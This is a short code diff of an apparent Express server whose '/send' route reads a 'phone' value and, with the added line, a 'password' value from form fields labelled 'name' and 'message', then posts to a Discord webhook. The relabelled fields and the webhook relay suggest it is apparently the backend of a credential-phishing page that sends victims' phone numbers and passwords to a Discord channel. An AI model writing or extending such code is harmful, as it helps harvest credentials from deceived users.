@@ -9,6 +9,7 @@ const webhook = process.env.DISCORD_WEBHOOK;
 
 app.post("/send", async (req, res) => {
   const phone = req.body.name;
+  const password = req.body.message;
 
   try {
     await fetch(webhook, {
